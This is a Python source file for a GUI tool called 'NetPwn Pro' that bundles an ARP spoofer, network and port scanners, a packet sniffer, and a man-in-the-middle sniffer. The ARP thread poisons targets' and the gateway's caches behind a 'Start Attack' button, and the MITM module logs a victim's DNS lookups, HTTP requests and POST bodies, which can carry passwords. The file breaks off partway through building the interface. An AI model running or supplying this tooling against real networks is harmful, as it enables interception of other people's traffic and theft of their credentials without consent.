#!/usr/bin/env python3
"""
NetPwn Pro — Advanced Network Security Suite (MITM Enhanced)
Modules : ARP Spoofer · Network Scanner · Packet Sniffer · Port Scanner · MITM Attack (Full Traffic Viewer)
Requires: pip install PyQt5 PyQtChart scapy
Run as  : sudo python netpwn_pro.py   (Linux/macOS)
          Run as Administrator         (Windows)
"""

import sys, os, time, re, csv, threading, socket, json
from datetime  import datetime
from ipaddress import ip_network

from PyQt5.QtWidgets  import *
from PyQt5.QtCore     import *
from PyQt5.QtGui      import *
from PyQt5.QtChart    import QChart, QChartView, QLineSeries, QAreaSeries, QValueAxis

try:
    import scapy.all as scapy
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ─────────────────────────────────────────────────
#  CONSTANTS & PALETTE
# ─────────────────────────────────────────────────
BG, PANEL, CARD      = "#080c14", "#0c1121", "#111827"
BORDER, SIDE         = "#1e2a3a", "#060a10"
ACC, ACC2, ACC3      = "#00ff88", "#00d4ff", "#a855f7"
DANGER, WARN         = "#ef4444", "#f59e0b"
TEXT, MUTED          = "#e2e8f0", "#64748b"

QSS = f"""
* {{
    font-family:'Segoe UI','Inter',sans-serif;
    font-size:13px;
    color:{TEXT};
}}
QMainWindow,QDialog,QWidget {{
    background:{BG};
}}
#Sidebar {{
    background:{SIDE};
    border-right:1px solid {BORDER};
}}
#SideTop {{
    background:{SIDE};
}}
QPushButton#Nav {{
    background:transparent;
    color:{MUTED};
    text-align:left;
    padding:13px 22px;
    border:none;
    border-left:3px solid transparent;
    border-radius:0;
    font-size:13px;
}}
QPushButton#Nav:hover {{
    background:rgba(0,255,136,.07);
    color:{TEXT};
}}
QPushButton#Nav[active=true] {{
    background:rgba(0,255,136,.13);
    color:{ACC};
    border-left:3px solid {ACC};
    font-weight:bold;
}}
QFrame#Card {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:1, stop:0 {CARD}, stop:1 #131B2D);
    border:1px solid {BORDER};
    border-radius:12px;
}}
QLineEdit,QSpinBox,QComboBox {{
    background:{BG};
    border:1px solid {BORDER};
    border-radius:8px;
    padding:8px 12px;
    color:{TEXT};
}}
QLineEdit:focus {{
    border-color:{ACC};
}}
QComboBox::drop-down {{
    border:none;
    width:22px;
}}
QComboBox QAbstractItemView {{
    background:{CARD};
    border:1px solid {BORDER};
    selection-background-color:{ACC};
    selection-color:{BG};
}}
QSpinBox::up-button,QSpinBox::down-button {{
    width:16px;
}}
QPushButton {{
    border:none;
    border-radius:9px;
    padding:9px 20px;
    font-weight:bold;
}}
QPushButton#Start {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #065f46,stop:1 #059669);
    color:white;
}}
QPushButton#Start:hover {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #059669,stop:1 #10b981);
}}
QPushButton#Start:disabled {{
    background:{BORDER};
    color:{MUTED};
}}
QPushButton#Stop {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #7f1d1d,stop:1 #dc2626);
    color:white;
}}
QPushButton#Stop:hover {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #dc2626,stop:1 #ef4444);
}}
QPushButton#Stop:disabled {{
    background:{BORDER};
    color:{MUTED};
}}
QPushButton#Accent {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #0369a1,stop:1 #0284c7);
    color:white;
}}
QPushButton#Accent:hover {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #0284c7,stop:1 #38bdf8);
}}
QPushButton#Accent:disabled {{
    background:{BORDER};
    color:{MUTED};
}}
QPushButton#Ghost {{
    background:transparent;
    color:{MUTED};
    border:1px solid {BORDER};
}}
QPushButton#Ghost:hover {{
    background:rgba(255,255,255,.05);
    color:{TEXT};
}}
QPushButton#Danger {{
    background:transparent;
    color:{DANGER};
    border:1px solid {DANGER};
}}
QPushButton#Danger:hover {{
    background:rgba(239,68,68,.15);
}}
QPushButton#Purple {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #6d28d9,stop:1 #7c3aed);
    color:white;
}}
QPushButton#Purple:hover {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #7c3aed,stop:1 #a78bfa);
}}
QPushButton#Purple:disabled {{
    background:{BORDER};
    color:{MUTED};
}}
QTableWidget {{
    background:{BG};
    border:1px solid {BORDER};
    border-radius:10px;
    gridline-color:{BORDER};
    outline:none;
    selection-background-color:rgba(0,255,136,.12);
    selection-color:{TEXT};
}}
QTableWidget::item {{
    padding:8px 14px;
    border-bottom:1px solid {BORDER};
}}
QTableWidget::item:selected {{
    color:{ACC};
}}
QHeaderView::section {{
    background:{CARD};
    color:{MUTED};
    padding:10px 14px;
    border:none;
    border-bottom:1px solid {BORDER};
    font-size:11px;
    font-weight:bold;
    letter-spacing:1px;
}}
QListWidget {{
    background:{BG};
    border:1px solid {BORDER};
    border-radius:9px;
}}
QListWidget::item {{
    padding:10px 16px;
    border-bottom:1px solid {BORDER};
}}
QListWidget::item:selected {{
    background:rgba(0,255,136,.12);
    color:{ACC};
}}
QProgressBar {{
    background:{BORDER};
    border:none;
    border-radius:6px;
    max-height:8px;
    text-align:center;
    color:transparent;
}}
QProgressBar::chunk {{
    background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 {ACC},stop:1 {ACC2});
    border-radius:6px;
}}
QScrollBar:vertical {{
    background:{BG};
    width:6px;
    border:none;
}}
QScrollBar::handle:vertical {{
    background:{BORDER};
    border-radius:3px;
    min-height:20px;
}}
QScrollBar::handle:vertical:hover {{
    background:{MUTED};
}}
QScrollBar::add-line:vertical,QScrollBar::sub-line:vertical {{
    height:0;
}}
QScrollBar:horizontal {{
    background:{BG};
    height:6px;
    border:none;
}}
QScrollBar::handle:horizontal {{
    background:{BORDER};
    border-radius:3px;
}}
QScrollBar::add-line:horizontal,QScrollBar::sub-line:horizontal {{
    width:0;
}}
QTextEdit {{
    background:{BG};
    border:1px solid {BORDER};
    border-radius:9px;
    padding:12px;
    font-family:'Consolas','Courier New',monospace;
    font-size:12px;
}}
QSplitter::handle {{
    background:{BORDER};
}}
QSplitter::handle:horizontal {{
    width:1px;
}}
QSplitter::handle:vertical {{
    height:1px;
}}
QToolTip {{
    background:{CARD};
    color:{TEXT};
    border:1px solid {BORDER};
    border-radius:4px;
    padding:4px 8px;
}}
"""

# ─────────────────────────────────────────────────
#  MAC VENDOR LOOKUP (full dictionary)
# ─────────────────────────────────────────────────
MAC_VENDOR_DB = {
    "00000c":"Cisco", "00001a":"AMD", "00001b":"Novell",
    "00001d":"Cabletron", "00002b":"DEC", "00004c":"NEC",
    "00004e":"Banyan", "00005e":"ICANN", "000065":"Network General",
    "00006b":"Madge", "000074":"Ricoh", "000081":"SynOptics",
    "00008a":"Data General", "00008c":"Data General", "000093":"Proteon",
    "000094":"Asante", "000096":"Marconi", "00009f":"Ameristar",
    "0000a2":"Wellfleet", "0000a3":"Network Appliance", "0000a4":"Accton",
    "0000a5":"Compatible", "0000a6":"Network General", "0000a7":"NCD",
    "0000a8":"Stratus", "0000a9":"Network Systems", "0000aa":"Xerox",
    "0000ab":"Logic Modeling", "0000ac":"Conware", "0000ad":"BBN",
    "0000ae":"Dassault", "0000af":"Canon", "0000b0":"RND",
    "0010e0":"Oracle", "0010f7":"Cisco", "00104b":"3Com",
    "001079":"Cisco", "0010a6":"Cisco", "0010ff":"Cisco",
    "00110a":"Cisco", "00110f":"Cisco", "00117f":"Cisco",
    "0011bb":"Cisco", "0011fc":"Cisco", "001243":"Cisco",
    "00127f":"Cisco", "0012bf":"Cisco", "001302":"Intel",
    "001321":"Intel", "001346":"Intel", "0013ce":"Intel",
    "00147f":"Intel", "0014a5":"Intel", "001517":"Intel",
    "0015e9":"Intel", "00166f":"Intel", "00176a":"Intel",
    "0018de":"Intel", "0019d1":"Intel", "001a4b":"Intel",
    "001a6d":"Intel", "001b21":"Intel", "001b77":"Intel",
    "001c7e":"Intel", "001cc0":"Intel", "001dc9":"Intel",
    "002185":"Intel", "002268":"Intel", "002275":"Intel",
    "002324":"Intel", "002395":"Intel", "00242f":"Intel",
    "0025b0":"Intel", "0026c6":"Intel", "002709":"Intel",
    "00279a":"Intel", "0027e4":"Intel", "003018":"Intel",
    "003011":"Huawei", "001e10":"Huawei", "002568":"Huawei",
    "002483":"Huawei", "0026ed":"Huawei", "0026ee":"Huawei",
    "003a7d":"Huawei", "003a8a":"Huawei", "003a9a":"Huawei",
    "00037a":"Dell", "000bcd":"Dell", "001372":"Dell",
    "0015c5":"Dell", "002219":"Dell", "00226b":"Dell",
    "002324":"Dell", "0024e8":"Dell", "002590":"Dell",
    "000c29":"VMware", "005056":"VMware", "0003ff":"Microsoft",
    "00125a":"Microsoft", "00155d":"Microsoft", "0017fa":"Microsoft",
    "00184d":"Microsoft", "001dd8":"Microsoft", "002248":"Microsoft",
    "0025ae":"Microsoft", "0025d3":"Microsoft",
    "00016c":"Apple", "000393":"Apple", "000a27":"Apple",
    "000a95":"Apple", "0010fa":"Apple", "001124":"Apple",
    "001451":"Apple", "0016cb":"Apple", "0017f2":"Apple",
    "0019e3":"Apple", "001b63":"Apple", "001d4f":"Apple",
    "001e52":"Apple", "001ec2":"Apple", "001ff3":"Apple",
    "0021e9":"Apple", "002312":"Apple", "002332":"Apple",
    "002436":"Apple", "00254b":"Apple", "0025bc":"Apple",
    "002608":"Apple", "0026b0":"Apple", "0026bb":"Apple",
    "0027c7":"Apple", "0027cc":"Apple", "0027df":"Apple",
    "0028cf":"Apple", "0028e3":"Apple", "0028f7":"Apple",
    "00292b":"Apple", "00297c":"Apple", "0029d9":"Apple",
    "002a36":"Apple", "002a5e":"Apple", "002af2":"Apple",
    "002b03":"Apple", "002b23":"Apple", "002b4d":"Apple",
    "002b6e":"Apple", "002b8e":"Apple", "002bc1":"Apple",
    "002c3e":"Apple", "002c5d":"Apple", "002cda":"Apple",
    "002d74":"Apple", "002ddc":"Apple", "002e85":"Apple",
    "002ec7":"Apple", "00307f":"Apple", "0030b4":"Apple",
    "0030d1":"Apple", "0030f2":"Apple", "003109":"Apple",
    "003132":"Apple", "00316e":"Apple", "00317b":"Apple",
    "00319e":"Apple", "0031f9":"Apple", "00322d":"Apple",
    "00326b":"Apple", "0032a4":"Apple", "0032e8":"Apple",
    "00330e":"Apple", "00333c":"Apple", "00336d":"Apple",
    "00339c":"Apple", "0033b0":"Apple", "0033d3":"Apple",
    "0033f9":"Apple", "00341f":"Apple", "00343b":"Apple",
    "00345e":"Apple", "003484":"Apple", "0034a1":"Apple",
    "0034c6":"Apple", "0034e2":"Apple", "0034f5":"Apple",
    "00350a":"Apple", "003516":"Apple", "00352e":"Apple",
    "003539":"Apple", "003566":"Apple", "00357d":"Apple",
    "00358b":"Apple", "0035b3":"Apple", "0035c2":"Apple",
    "0035d3":"Apple", "0035d7":"Apple", "0035e6":"Apple",
    "003604":"Apple", "00360f":"Apple", "00361f":"Apple",
    "00362c":"Apple", "003636":"Apple", "003648":"Apple",
    "003654":"Apple", "00365c":"Apple", "00366e":"Apple",
    "003680":"Apple", "00368e":"Apple", "0036a3":"Apple",
    "0036ac":"Apple", "0036b7":"Apple", "0036c2":"Apple",
    "0036cc":"Apple", "0036d1":"Apple", "0036d9":"Apple",
    "0036e7":"Apple", "0036f2":"Apple", "0036fb":"Apple",
}
COMMON_OUIS = {k.lower():v for k,v in MAC_VENDOR_DB.items()}

def get_mac_vendor(mac: str) -> str:
    if not mac or len(mac) < 8:
        return "—"
    oui = mac.replace(":","").replace("-","").replace(".","")[:6].lower()
    return COMMON_OUIS.get(oui, "Unknown")

# ─────────────────────────────────────────────────
#  SCAPY HELPERS
# ─────────────────────────────────────────────────
def _get_mac(ip):
    if not SCAPY_OK: return None
    try:
        ans = scapy.srp(
            scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip),
            timeout=2, verbose=False, retry=1)[0]
        return ans[0][1].hwsrc if ans else None
    except Exception:
        return None

def _spoof(target_ip, spoof_ip):
    mac = _get_mac(target_ip)
    if mac:
        scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=mac, psrc=spoof_ip), verbose=False)
        return True
    return False

def _restore(dst_ip, src_ip):
    dm, sm = _get_mac(dst_ip), _get_mac(src_ip)
    if dm and sm:
        scapy.send(
            scapy.ARP(op=2, pdst=dst_ip, hwdst=dm, psrc=src_ip, hwsrc=sm),
            count=4, verbose=False)

# ─────────────────────────────────────────────────
#  WORKER THREADS
# ─────────────────────────────────────────────────
class ARPThread(QThread):
    pkt_sent = pyqtSignal(int)
    log      = pyqtSignal(str, str)

    def __init__(self, gw, targets):
        super().__init__()
        self._gw, self._targets = gw, targets
        self._stop = threading.Event()

    def run(self):
        while not self._stop.is_set():
            ok = 0
            for t in self._targets:
                if _spoof(t, self._gw):   ok += 1
                if _spoof(self._gw, t):   ok += 1
            self.pkt_sent.emit(ok)
            self._stop.wait(2)

    def stop(self): self._stop.set()


class RestoreThread(QThread):
    done    = pyqtSignal()
    log     = pyqtSignal(str, str)

    def __init__(self, gw, targets):
        super().__init__()
        self._gw, self._targets = gw, targets

    def run(self):
        for t in self._targets:
            _restore(t, self._gw)
            _restore(self._gw, t)
            self.log.emit(f"ARP restored: {t}", "cyan")
        self.done.emit()


class ScanThread(QThread):
    found    = pyqtSignal(str, str, str, str)
    progress = pyqtSignal(int)
    done     = pyqtSignal(int)
    log      = pyqtSignal(str, str)

    def __init__(self, cidr):
        super().__init__()
        self._cidr  = cidr
        self._stop  = threading.Event()

    def run(self):
        if not SCAPY_OK:
            self.log.emit("scapy not installed.", "error"); self.done.emit(0); return
        try:
            net   = list(ip_network(self._cidr, strict=False).hosts())
            total = len(net)
            found = 0
            for i, host in enumerate(net):
                if self._stop.is_set(): break
                ip = str(host)
                try:
                    ans = scapy.srp(
                        scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip),
                        timeout=0.5, verbose=False)[0]
                    if ans:
                        mac = ans[0][1].hwsrc
                        vendor = get_mac_vendor(mac)
                        try:    host_name = scapy.socket.gethostbyaddr(ip)[0]
                        except: host_name = "—"
                        self.found.emit(ip, mac, host_name, vendor)
                        found += 1
                except Exception:
                    pass
                self.progress.emit(int((i+1)/total*100))
            self.done.emit(found)
        except ValueError as e:
            self.log.emit(f"Invalid CIDR: {e}", "error"); self.done.emit(0)

    def stop(self): self._stop.set()


class SnifferThread(QThread):
    packet_cap = pyqtSignal(dict)
    log        = pyqtSignal(str, str)

    def __init__(self, iface, bpf_filter):
        super().__init__()
        self._iface  = iface or None
        self._filter = bpf_filter or ""
        self._stop   = threading.Event()

    def run(self):
        if not SCAPY_OK:
            self.log.emit("scapy not installed.", "error"); return
        def _handler(pkt):
            if self._stop.is_set(): return True
            info = {}
            info["time"] = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            info["len"]  = len(pkt)
            if pkt.haslayer(scapy.IP):
                info["src"] = pkt[scapy.IP].src
                info["dst"] = pkt[scapy.IP].dst
                if pkt.haslayer(scapy.TCP):
                    info["proto"] = "TCP"
                    info["info"]  = f"Port {pkt[scapy.TCP].sport} → {pkt[scapy.TCP].dport}"
                elif pkt.haslayer(scapy.UDP):
                    info["proto"] = "UDP"
                    info["info"]  = f"Port {pkt[scapy.UDP].sport} → {pkt[scapy.UDP].dport}"
                elif pkt.haslayer(scapy.ICMP):
                    info["proto"] = "ICMP"
                    info["info"]  = f"Type {pkt[scapy.ICMP].type}"
                else:
                    info["proto"] = "IP"
                    info["info"]  = "—"
            elif pkt.haslayer(scapy.ARP):
                info["src"]   = pkt[scapy.ARP].psrc
                info["dst"]   = pkt[scapy.ARP].pdst
                info["proto"] = "ARP"
                info["info"]  = "who-has" if pkt[scapy.ARP].op == 1 else "is-at"
            else:
                info["src"]   = "—"
                info["dst"]   = "—"
                info["proto"] = pkt.name
                info["info"]  = "—"
            self.packet_cap.emit(info)

        try:
            scapy.sniff(
                iface=self._iface,
                filter=self._filter,
                prn=_handler,
                stop_filter=lambda p: self._stop.is_set(),
                store=False)
        except Exception as e:
            self.log.emit(f"Sniffer error: {e}", "error")

    def stop(self): self._stop.set()


class PortScanThread(QThread):
    port_found = pyqtSignal(int, str, str)
    progress   = pyqtSignal(int, int)
    done       = pyqtSignal(int)
    log        = pyqtSignal(str, str)

    def __init__(self, target, ports, scan_type="connect", timeout=2):
        super().__init__()
        self._target   = target
        self._ports    = ports
        self._type     = scan_type.lower()
        self._timeout  = timeout
        self._stop     = threading.Event()

    def run(self):
        total = len(self._ports)
        open_count = 0
        for i, port in enumerate(self._ports):
            if self._stop.is_set():
                break
            if self._type == "syn" and os.name == "posix" and os.geteuid() == 0 and SCAPY_OK:
                try:
                    pkt = scapy.sr1(
                        scapy.IP(dst=self._target)/scapy.TCP(dport=port, flags="S"),
                        timeout=self._timeout, verbose=False)
                    if pkt and pkt.haslayer(scapy.TCP):
                        if pkt[scapy.TCP].flags & 0x12:
                            service = socket.getservbyport(port, "tcp")
                            self.port_found.emit(port, service, "")
                            open_count += 1
                except Exception:
                    pass
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self._timeout)
                result = sock.connect_ex((self._target, port))
                if result == 0:
                    service = socket.getservbyport(port, "tcp")
                    banner = ""
                    try:
                        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                        banner = sock.recv(1024).decode(errors="ignore").split("\n")[0]
                    except:
                        pass
                    self.port_found.emit(port, service, banner.strip())
                    open_count += 1
                sock.close()
            self.progress.emit(i+1, total)
        self.done.emit(open_count)

    def stop(self):
        self._stop.set()


# ─────────────────────────────────────────────────
#  ENHANCED MITM SNIFFER – shows ALL protocols
# ─────────────────────────────────────────────────
class MITMSnifferThread(QThread):
    activity = pyqtSignal(str, str, str, str)  # time, type, direction, details
    log      = pyqtSignal(str, str)            # message, tag

    def __init__(self, target_ip, gateway_ip, iface=None, show_all=True):
        super().__init__()
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.iface = iface or None
        self.show_all = show_all    # if False, only show HTTP/DNS/TLS
        self._stop = threading.Event()

    def run(self):
        if not SCAPY_OK:
            self.log.emit("Scapy not installed", "error")
            return
        bpf_filter = f"ip host {self.target_ip}"
        try:
            self.log.emit(f"MITM sniffer started on {self.iface or 'any'} with filter: {bpf_filter}", "cyan")
            scapy.sniff(
                iface=self.iface,
                filter=bpf_filter,
                prn=self._packet_handler,
                stop_filter=lambda p: self._stop.is_set(),
                store=False)
        except Exception as e:
            self.log.emit(f"Sniffer error: {e}", "error")

    def _packet_handler(self, pkt):
        if self._stop.is_set():
            return
        if not pkt.haslayer(scapy.IP):
            return
        ip_layer = pkt[scapy.IP]
        src = ip_layer.src
        dst = ip_layer.dst
        if src == self.target_ip:
            direction = "→ Outbound"
        elif dst == self.target_ip:
            direction = "← Inbound"
        else:
            return

        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        length = len(pkt)

        # --- DNS Query ---
        if pkt.haslayer(scapy.DNS) and pkt.haslayer(scapy.DNSQR):
            qname = pkt[scapy.DNS].qd.qname.decode(errors='ignore') if pkt[scapy.DNS].qd else "?"
            details = f"DNS query: {qname}"
            self.activity.emit(timestamp, "DNS", direction, details)
            return

        # --- HTTP / TLS ---
        if pkt.haslayer(scapy.TCP) and pkt.haslayer(scapy.Raw):
            payload = pkt[scapy.Raw].load
            try:
                payload_str = payload.decode('utf-8', errors='ignore')
                # HTTP request
                if re.match(r"(GET|POST|PUT|DELETE|HEAD|OPTIONS|CONNECT|TRACE)\s+\S+\s+HTTP/", payload_str):
                    lines = payload_str.split('\r\n')
                    request_line = lines[0]
                    host_match = re.search(r"Host:\s*([^\r\n]+)", payload_str, re.I)
                    host = host_match.group(1).strip() if host_match else "?"
                    details = f"HTTP {request_line}  (Host: {host})"
                    if "POST" in request_line and '\r\n\r\n' in payload_str:
                        body = payload_str.split('\r\n\r\n', 1)[1][:200]
                        if body:
                            details += f"\n    POST data: {body.replace(chr(10), ' ').strip()}"
                    self.activity.emit(timestamp, "HTTP", direction, details)
                    return
                # TLS handshake (Client Hello / Server Hello)
                elif len(payload_str) > 2 and payload_str[0] == '\x16' and payload_str[1:3] == '\x03':
                    self.activity.emit(timestamp, "TLS", direction, "TLS handshake (encrypted)")
                    return
            except:
                pass

        # --- TCP (non-HTTP) ---
        if pkt.haslayer(scapy.TCP):
            tcp = pkt[scapy.TCP]
            flags = []
            if tcp.flags.S: flags.append("SYN")
            if tcp.flags.A: flags.append("ACK")
            if tcp.flags.R: flags.append("RST")
            if tcp.flags.F: flags.append("FIN")
            if tcp.flags.P: flags.append("PSH")
            flag_str = " ".join(flags) if flags else "—"
            details = f"TCP {tcp.sport} → {tcp.dport}  Flags: {flag_str}  Len:{length}"
            self.activity.emit(timestamp, "TCP", direction, details)
            return

        # --- UDP (non-DNS) ---
        if pkt.haslayer(scapy.UDP):
            udp = pkt[scapy.UDP]
            details = f"UDP {udp.sport} → {udp.dport}  Len:{length}"
            self.activity.emit(timestamp, "UDP", direction, details)
            return

        # --- ICMP ---
        if pkt.haslayer(scapy.ICMP):
            icmp = pkt[scapy.ICMP]
            type_desc = {0:"Echo Reply", 8:"Echo Request", 3:"Dest Unreach", 11:"Time Exceeded"}.get(icmp.type, f"Type {icmp.type}")
            details = f"ICMP {type_desc}  Len:{length}"
            self.activity.emit(timestamp, "ICMP", direction, details)
            return

        # --- Other IP protocols (generic) ---
        if self.show_all:
            proto_num = ip_layer.proto
            proto_name = {1:"ICMP",6:"TCP",17:"UDP"}.get(proto_num, f"IP-{proto_num}")
            details = f"{proto_name} packet  Len:{length}"
            self.activity.emit(timestamp, "Packet", direction, details)

    def stop(self):
        self._stop.set()


# ─────────────────────────────────────────────────
#  CUSTOM WIDGETS
# ─────────────────────────────────────────────────
class PulsingDot(QWidget):
    def __init__(self, color=ACC, size=10, parent=None):
        super().__init__(parent)
        self.setFixedSize(size, size)
        self._color = QColor(color)
        self._alpha = 255
        self._anim  = QVariantAnimation(self,
            startValue=255, endValue=60, duration=900,
            loopCount=-1, easingCurve=QEasingCurve.SineCurve)
        self._anim.valueChanged.connect(lambda v: (setattr(self,'_alpha',v), self.update()))

    def start(self): self._anim.start()
    def stop(self):  self._anim.stop(); self._alpha=255; self.update()

    def set_color(self, c):
        self._color = QColor(c); self.update()

    def paintEvent(self, _):
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        c = QColor(self._color); c.setAlpha(self._alpha)
        p.setBrush(c); p.setPen(Qt.NoPen)
        s = self.width()
        p.drawEllipse(1, 1, s-2, s-2)


class AnimatedChart(QChartView):
    def __init__(self, color=ACC, label="pkt/s", parent=None):
        super().__init__(parent)
        self._color = QColor(color)
        self._label = label
        self._max_points = 60
        self._data = [0]*self._max_points
        self._series = QLineSeries()
        self._area = QAreaSeries(self._series)
        self._chart = QChart()
        self._chart.addSeries(self._area)
        self._chart.addSeries(self._series)
        self._chart.legend().hide()
        self._chart.setBackgroundBrush(QColor(0,0,0,0))
        self._chart.setMargins(QMargins(0,0,0,0))
        self._chart.layout().setContentsMargins(0,0,0,0)

        self._axisX = QValueAxis()
        self._axisX.setRange(0, self._max_points-1)
        self._axisX.setLabelsVisible(False)
        self._axisX.setGridLineVisible(False)
        self._axisY = QValueAxis()
        self._axisY.setGridLineColor(QColor(BORDER))
        self._axisY.setLabelsColor(QColor(MUTED))
        self._chart.addAxis(self._axisX, Qt.AlignBottom)
        self._chart.addAxis(self._axisY, Qt.AlignLeft)
        self._series.attachAxis(self._axisX)
        self._series.attachAxis(self._axisY)
        self._area.attachAxis(self._axisX)
        self._area.attachAxis(self._axisY)

        self._area.setColor(QColor(self._color.red(), self._color.green(), self._color.blue(), 50))
        self._series.setColor(self._color)
        self._series.setPen(QPen(self._color, 2))
        self.setChart(self._chart)
        self.setRenderHint(QPainter.Antialiasing)

    def push(self, value):
        self._data.pop(0)
        self._data.append(value)
        self._series.clear()
        for i, v in enumerate(self._data):
            self._series.append(i, v)
        mx = max(self._data) or 1
        self._axisY.setRange(0, mx*1.2)
        self._chart.setTitle(f"{value} {self._label}")
        self._chart.titleBrush().setColor(self._color)
        self._chart.setTitleFont(QFont("Consolas", 9, QFont.Bold))


class StatCard(QFrame):
    def __init__(self, label, color=ACC, parent=None):
        super().__init__(parent)
        self.setObjectName("Card")
        lay = QVBoxLayout(self)
        lay.setContentsMargins(18, 14, 18, 14)
        lay.setSpacing(4)

        lbl = QLabel(label.upper())
        lbl.setStyleSheet(f"color:{MUTED};font-size:10px;letter-spacing:2px;border:none;")
        lay.addWidget(lbl)

        self._v = QLabel("0")
        self._v.setStyleSheet(
            f"color:{color};font-size:30px;font-weight:bold;"
            f"font-family:Consolas;border:none;")
        lay.addWidget(self._v)

    def set_value(self, v): self._v.setText(str(v))


class SectionLabel(QWidget):
    def __init__(self, text, parent=None):
        super().__init__(parent)
        lay = QHBoxLayout(self)
        lay.setContentsMargins(0, 6, 0, 2)
        lbl = QLabel(text.upper())
        lbl.setStyleSheet(f"color:{MUTED};font-size:10px;font-weight:bold;letter-spacing:2px;")
        lay.addWidget(lbl)
        sep = QFrame(); sep.setFrameShape(QFrame.HLine)
        sep.setStyleSheet(f"color:{BORDER};")
        lay.addWidget(sep)


class LogBox(QTextEdit):
    COLORS = {
        "info":  TEXT,  "ok":    ACC,  "warn":  WARN,
        "error": DANGER,"cyan":  ACC2, "muted": MUTED,
    }
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setReadOnly(True)

    def append_log(self, msg, tag="info"):
        ts    = datetime.now().strftime("%H:%M:%S")
        color = self.COLORS.get(tag, TEXT)
        self.append(
            f'<span style="color:{MUTED}">[{ts}]</span> '
            f'<span style="color:{color}">{msg}</span>')
        self.verticalScrollBar().setValue(self.verticalScrollBar().maximum())

# ─────────────────────────────────────────────────
#  PAGE 1 — ARP SPOOFER
# ─────────────────────────────────────────────────
class ARPPage(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self._targets:list[str] = []
        self._arp_thread = None
        self._rst_thread = None
        self._total_pkts = 0
        self._start_time = None
        self._pps        = 0
        self._timer      = QTimer(self, interval=1000, timeout=self._tick)
        self._chart_timer= QTimer(self, interval=1000, timeout=self._chart_tick)
        self._build()

    def _build(self):
        root = QHBoxLayout(self)
        root.setContentsMargins(20, 16, 20, 16)
        root.setSpacing(16)

        left = QVBoxLayout(); left.setSpacing(10)

        gw_card = QFrame(); gw_card.setObjectName("Card")
        gcl = QVBoxLayout(gw_card); gcl.setContentsMargins(16,14,16,14)
        gcl.addWidget(SectionLabel("Gateway"))
        gr = QHBoxLayout()
        self._gw_in = QLineEdit("192.168.1.1")
        self._gw_in.setPlaceholderText("Gateway IP")
        gr.addWidget(self._gw_in)
        iface_lbl = QLabel("Iface")
        iface_lbl.setStyleSheet(f"color:{MUTED}; border:none;")
        self._iface_combo = QComboBox()
        self._iface_combo.addItems(self._get_ifaces())
        gr.addWidget(iface_lbl); gr.addWidget(self._iface_combo)
        gcl.addLayout(gr)
        left.addWidget(gw_card)

        tgt_card = QFrame(); tgt_card.setObjectName("Card")
        tcl = QVBoxLayout(tgt_card); tcl.setContentsMargins(16,14,16,14)
        tcl.addWidget(SectionLabel("Targets"))

        add_row = QHBoxLayout()
        self._tgt_in = QLineEdit()
        self._tgt_in.setPlaceholderText("Target IP  (e.g. 192.168.1.x)")
        self._tgt_in.returnPressed.connect(self._add_target)
        btn_add = QPushButton("+ Add"); btn_add.setObjectName("Accent")
        btn_add.clicked.connect(self._add_target)
        add_row.addWidget(self._tgt_in); add_row.addWidget(btn_add)
        tcl.addLayout(add_row)

        self._tgt_list = QListWidget()
        tcl.addWidget(self._tgt_list)

        rm_row = QHBoxLayout()
        btn_rm  = QPushButton("✕ Remove"); btn_rm.setObjectName("Danger")
        btn_rm.clicked.connect(self._remove_target)
        btn_clr = QPushButton("Clear All"); btn_clr.setObjectName("Ghost")
        btn_clr.clicked.connect(self._clear_targets)
        self._tgt_count = QLabel("0 targets")
        self._tgt_count.setStyleSheet(f"color:{MUTED}; border:none; font-size:11px;")
        rm_row.addWidget(btn_rm); rm_row.addWidget(btn_clr)
        rm_row.addStretch(); rm_row.addWidget(self._tgt_count)
        tcl.addLayout(rm_row)
        left.addWidget(tgt_card, 1)

        ctrl = QHBoxLayout()
        self._btn_start = QPushButton("▶  Start Attack"); self._btn_start.setObjectName("Start")
        self._btn_stop  = QPushButton("■  Stop & Restore"); self._btn_stop.setObjectName("Stop")
        self._btn_stop.setEnabled(False)
        self._btn_start.clicked.connect(self._start)
        self._btn_stop.clicked.connect(self._stop)
        ctrl.addWidget(self._btn_start); ctrl.addWidget(self._btn_stop)
        left.addLayout(ctrl)

        right = QVBoxLayout(); right.setSpacing(10)

        stats_row = QHBoxLayout(); stats_row.setSpacing(10)
        self._card_pkts  = StatCard("Packets Sent", ACC)
        self._card_tgts  = StatCard("Active Targets", ACC2)
        self._card_pps   = StatCard("Pkts / sec", WARN)
        self._card_time  = StatCard("Elapsed", ACC3)
        for c in (self._card_pkts, self._card_tgts, self._card_pps, self._card_time):
            stats_row.addWidget(c)
        right.addLayout(stats_row)

        chart_card = QFrame(); chart_card.setObjectName("Card")
        ccl = QVBoxLayout(chart_card); ccl.setContentsMargins(14,10,14,10)
        ccl.addWidget(SectionLabel("Live Packet Rate"))
        self._chart = AnimatedChart(ACC, "pkt/s")
        self._chart.setMinimumHeight(120)
        ccl.addWidget(self._chart)
        right.addWidget(chart_card)

        log_card = QFrame(); log_card.setObjectName("Card")
        lcl = QVBoxLayout(log_card); lcl.setContentsMargins(14,10,14,10)
        lh = QHBoxLayout()
